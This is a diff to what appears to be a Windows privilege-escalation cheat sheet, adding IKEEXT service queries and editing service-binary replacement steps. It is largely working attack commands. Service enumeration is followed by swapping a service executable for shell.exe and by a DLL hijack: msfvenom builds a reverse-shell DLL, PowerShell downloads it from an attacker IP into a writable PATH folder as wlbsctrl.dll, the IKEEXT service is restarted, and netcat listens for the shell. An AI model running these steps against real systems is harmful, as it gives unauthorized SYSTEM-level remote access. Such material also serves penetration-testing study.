@@ -77,13 +77,15 @@ tasklist /v | findstr /si "system admin"
 tasklist /SVC
  
 sc query state= all
+sc query IKEEXT
 wmic service list brief  
 wmic product get name, version, vendor 
 wmic qfe get Caption, Description, HotFixID, InstalledOn 
 wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """ 
- 
+wmic service where caption="IKEEXT" get name, caption, state, startmode
+
 icalcs C:\Barracuda\bd.exe 
-copy /Y C:\xammp\htdocs\shell.exe C:\bd\bd.exe 
+copy /Y C:\Windows\Temp\shell.exe C:\bd\bd.exe 
 shutdown -r 
 nc -nvlp 445 
  
@@ -286,6 +288,7 @@ DLL Hijack
 Example: Vista/Win8
 
 sc query IKEEXT          ..Want LocalSystem 
+wmic service where caption="IKEEXT" get name, caption, state, startmode 
 c:> dir wlbsctrl.dll /s  ..Want Missing (Normally C:\Windows\System32\wlbsctrl.dll)
 echo %path%              ..Want Exploitable-Path 
 cacls "C:\Python27"      ..Want Authenticated Users (M) 
@@ -293,6 +296,7 @@ accesssschk.exe -dqv "C:\Python27"
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.162.46 LPORT=445 -f dll > shell.dll  
 powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.162.46/shell.dll', 'C:\Python27\wlbsctrl.dll')" 
 copy shell.dll C:\Python27\wlbsctrl.dll 
+net stop IKEEXT
 sc restart IKEEXT
 shutdown -r -t 10 && exit   
 rlwrap nc -nvlp 445 
